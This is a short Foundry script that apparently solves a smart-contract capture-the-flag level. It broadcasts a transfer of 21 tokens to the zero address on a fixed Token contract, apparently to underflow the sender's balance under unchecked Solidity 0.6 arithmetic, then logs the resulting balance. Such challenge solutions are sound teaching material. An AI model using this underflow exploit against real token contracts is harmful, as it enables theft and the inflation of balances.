// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenSolution is Script {
    Token token = Token(0xd55Ef71776f094d846D5b3412852737d13843830);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(0), 21);
        console.log("MY Balance: ", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
